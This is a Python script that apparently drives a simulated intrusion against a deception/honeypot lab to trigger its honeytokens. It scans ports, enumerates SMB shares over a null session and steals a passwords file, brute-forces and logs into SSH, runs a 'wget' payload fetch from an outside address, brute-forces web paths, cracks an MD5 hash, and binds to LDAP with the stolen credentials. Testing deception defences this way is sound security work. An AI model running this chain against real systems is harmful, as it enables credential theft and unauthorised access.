#!/usr/bin/env python3
"""Attack simulation against a ReD-Pot CE lab (up to 3 decoys): walks the full breadcrumb chain.

  FS : port scan, RDP cookie, SMB share enum, read IT\\passwords.txt           (L1 → L3)
  WEB: SSH brute force, SSH login with the stolen deploy password, commands     (L2 → L5 honeytoken)
       path brute force, read /.env, admin login with the seeded portal password (L5 honeytoken)
  DC : LDAP simple bind with the stolen svc_web / svc_scan domain passwords     (L5 honeytoken)
  BKP: FTP download of the DB dump (only with --bkp; not part of the default 3-decoy lab)
  FS : open the bait document, which calls home to the web decoy                (L5 document beacon)

usage: attack_sim.py --fs 172.30.50.21 --web 172.30.50.22 --dc 172.30.50.10 --domain CORP
       (dev: --fs 127.0.0.1:20000 means host 127.0.0.1 with port offset 20000)
Only talks to the ReD-Pot sensors you point it at. Uses harmless, fixed commands.
"""
import argparse
import ftplib
import io
import re
import socket
import ssl
import sys
import time
import urllib.parse
import urllib.request


def tgt(spec):
    h, _, o = spec.partition(":")
    return h, int(o or 0)


PAUSE = 0


def step(msg):
    if PAUSE:
        time.sleep(PAUSE)
    print(f"[*] {time.strftime('%H:%M:%S')} {msg}", flush=True)


def scan(host, off, ports):
    open_ = []
    for p in ports:
        s = socket.socket()
        s.settimeout(1)
        try:
            s.connect((host, p + off))
            open_.append(p)
        except OSError:
            pass
        finally:
            s.close()
    return open_


def _tlv(tag, body):
    n = len(body)
    ln = bytes([n]) if n < 0x80 else bytes([0x80 | len(n.to_bytes(4, "big").lstrip(b"\0"))]) + n.to_bytes(4, "big").lstrip(b"\0")
    return bytes([tag]) + ln + body


def ldap_bind(host, port, user, password):
    """LDAPv3 simple bind; returns the LDAP resultCode (0 = success, 49 = invalid credentials, -1 = no answer)."""
    req = _tlv(0x30, _tlv(0x02, b"\x01") + _tlv(0x60, _tlv(0x02, b"\x03") + _tlv(0x04, user.encode())
                                                   + _tlv(0x80, password.encode())))
    try:
        with socket.create_connection((host, port), 5) as s:
            s.sendall(req)
            r = s.recv(4096)
    except OSError:
        return -1
    i = r.find(b"\x0a\x01", max(r.find(b"\x61"), 0))
    return r[i + 2] if i >= 0 and len(r) > i + 2 else -1


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--fs", required=True)
    ap.add_argument("--web", required=True)
    ap.add_argument("--dc", help="domain controller decoy (LDAP bind with stolen domain passwords)")
    ap.add_argument("--bkp", help="backup decoy (omit when the deployment has none; the 3-decoy lab has none)")
    ap.add_argument("--domain", default="CORP", help="NetBIOS domain the workstation logs on with")
    ap.add_argument("--console", help="console base URL (only for bait documents of the old layout)")
    ap.add_argument("--workstation", default="ACC-PC-07")
    ap.add_argument("--user", default="anna.k")
    ap.add_argument("--pause", type=float, default=0, help="seconds to wait between steps (live demos)")
    a = ap.parse_args()
    global PAUSE
    PAUSE = a.pause
    fs, fso = tgt(a.fs)
    web, webo = tgt(a.web)
    bkp, bkpo = tgt(a.bkp) if a.bkp else (None, 0)
    dc, dco = tgt(a.dc) if a.dc else (None, 0)
    results = {}

    step(f"port scan {fs}")
    results["scan"] = scan(fs, fso, [21, 22, 80, 135, 139, 443, 445, 3389, 5985])
    print("    open:", results["scan"])

    step("RDP probe with username cookie")
    s = socket.create_connection((fs, 3389 + fso), 3)
    cookie = f"Cookie: mstshash={a.user}\r\n".encode()
    neg = bytes([1, 0, 8, 0, 3, 0, 0, 0])
    x224 = bytes([6 + len(cookie) + len(neg), 0xE0, 0, 0, 0, 0, 0]) + cookie + neg
    s.sendall(bytes([3, 0]) + (4 + len(x224)).to_bytes(2, "big") + x224)
    resp = s.recv(64)
    print("    RDP response bytes:", len(resp))
    s.close()

    step("SMB: logon, enumerate shares, list IT, steal passwords.txt")
    from impacket.smbconnection import SMBConnection
    c = SMBConnection(a.workstation, fs, sess_port=445 + fso, myName=a.workstation)
    c.login("", "")                    # null session: named logons need a bait password (v0.4)
    shares = [sh["shi1_netname"][:-1] for sh in c.listShares()]
    print("    shares:", shares)
    files = [f.get_longname() for f in c.listPath("IT", "*")]
    print("    IT:", files)
    buf = io.BytesIO()
    c.getFile("IT", "passwords.txt", buf.write)
    pw_txt = buf.getvalue().decode(errors="replace")
    c.logoff()
    m_ssh = re.search(r"ssh\s+(\S+) / (\S+)", pw_txt)
    m_ftp = re.search(r"ftp\s+(\S+) / (\S+)", pw_txt)            # only when the deployment has a backup decoy
    m_scan = re.search(r"\\(svc_scan) / (\S+)", pw_txt)           # domain account, valid on the DC
    print("    stolen:", m_ssh.groups(), m_ftp.groups() if m_ftp else None, m_scan.groups() if m_scan else None)

    step("SSH brute force noise, then login to WEB01 with stolen creds")
    import paramiko
    for guess in ("admin", "123456", "password"):
        cl = paramiko.SSHClient()
        cl.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            cl.connect(web, 22 + webo, username="root", password=guess, timeout=5, allow_agent=False, look_for_keys=False)
        except paramiko.AuthenticationException:
            pass
        finally:
            cl.close()
    cl = paramiko.SSHClient()
    cl.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    cl.connect(web, 22 + webo, username=m_ssh.group(1), password=m_ssh.group(2), timeout=5, allow_agent=False, look_for_keys=False)
    out = {}
    for cmd in ("id", "uname -a", "cat ~/.bash_history", "cat notes.txt", "wget http://203.0.113.50/x.sh"):
        _, so, _ = cl.exec_command(cmd)
        out[cmd] = so.read().decode(errors="replace").strip()
    cl.close()
    print("    id ->", out["id"])

    dump = io.BytesIO()
    if not bkp or not m_ftp:
        print("[-] no backup decoy: skipping FTP + DB dump (admin password comes from /.env instead)")
    else:
        step("FTP to BKP01 with stolen creds, download DB dump")
        f = ftplib.FTP()
        f.connect(bkp, 21 + bkpo, timeout=10)
        f.login(m_ftp.group(1), m_ftp.group(2))
        if bkpo:  # dev mode: PASV ports are not offset; connect to host directly
            f.set_pasv(True)
        print("    /backups:", f.nlst("/backups"))
        f.retrbinary("RETR /backups/db_dump_2026-10.sql", dump.write)
        f.quit()
        hint = re.search(r"reset to the seasonal one \((\w{3})", dump.getvalue().decode())
        print("    dump bytes:", len(dump.getvalue()), "hint:", hint.group(1) if hint else None)

    step("Web: scanner UA + path brute force + .env + admin login")
    base = f"http://{web}:{80 + webo}"
    def get(path, ua="Mozilla/5.0"):
        try:
            with urllib.request.urlopen(urllib.request.Request(base + path, headers={"User-Agent": ua}), timeout=5) as r:
                return r.status, r.read()
        except urllib.error.HTTPError as e:
            return e.code, b""
    for p in ["/wp-admin", "/.git/config", "/backup.zip", "/admin.php", "/config.php", "/old", "/test", "/dev",
              "/api", "/phpinfo.php", "/server-status", "/db", "/sql", "/upload", "/uploads", "/files", "/tmp"]:
        get(p, "gobuster/3.6")
    st, env = get("/.env")
    envs = dict(re.findall(r"^([A-Z_]+)=(\S+)$", env.decode(errors="replace"), re.M))
    print("    .env:", st, {k: envs.get(k) for k in ("DB_PASSWORD", "PORTAL_ADMIN_PASSWORD", "LDAP_USERNAME", "LDAP_PASSWORD")})
    cracked = envs.get("PORTAL_ADMIN_PASSWORD")
    if not cracked and dump.getvalue():
        # crack the md5 from the dump with the hint (seasonal password) — simulate offline cracking
        import hashlib
        m5 = re.search(r"'admin','[^']+','([0-9a-f]{32})'", dump.getvalue().decode())
        md5 = m5.group(1) if m5 else "0" * 32
        cracked = next((f"{s}{y}!" for s in ("Spring", "Summer", "Autumn", "Winter") for y in range(2019, 2028)
                        if hashlib.md5(f"{s}{y}!".encode()).hexdigest() == md5), None)
        print("    cracked admin md5:", cracked)
    data = urllib.parse.urlencode({"username": "admin", "password": cracked or "x"}).encode()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor())
    r = opener.open(urllib.request.Request(base + "/admin/login", data=data), timeout=5)
    print("    admin login ->", r.status, "Signed in" in r.read().decode())

    if dc:
        step(f"DC: LDAP simple bind on {dc} with the stolen domain passwords")
        creds = []
        if envs.get("LDAP_USERNAME") and envs.get("LDAP_PASSWORD"):
            creds.append((envs["LDAP_USERNAME"], envs["LDAP_PASSWORD"]))          # svc_web@domain from WEB /.env
        if m_scan:
            creds.append((f"{a.domain}\\{m_scan.group(1)}", m_scan.group(2)))    # svc_scan from FS passwords.txt
        for user, pw in creds:
            print(f"    bind {user} ->", "success" if ldap_bind(dc, 389 + dco, user, pw) == 0 else "failed")

    step("Bait document opened (Word fetches the linked image)")
    import zipfile, html
    c = SMBConnection(a.workstation, fs, sess_port=445 + fso, myName=a.workstation)
    c.login("", "")                    # null session: named logons need a bait password (v0.4)
    buf = io.BytesIO()
    c.getFile("FINANCE", "Salaries_2026.docx", buf.write)
    c.logoff()
    rels = zipfile.ZipFile(io.BytesIO(buf.getvalue())).read("word/_rels/document.xml.rels").decode()
    url = html.unescape(re.search(r'Target="(http[^"]+)"', rels).group(1))
    if "/assets/" not in url and a.console:   # old layout: beacon on the manager
        url = a.console.rstrip("/") + urllib.parse.urlsplit(url).path
    if fso or webo:                    # dev lab with port offsets
        u = urllib.parse.urlsplit(url); url = f"http://{web}:{80 + webo}{u.path}"
    print("    beacon url:", url)
    with urllib.request.urlopen(urllib.request.Request(url, headers={"User-Agent": "Microsoft Office Word 2016"}), timeout=5) as r:
        print("    beacon ->", r.status, r.headers.get("Content-Type"))
    print("[+] attack chain complete")


if __name__ == "__main__":
    main()
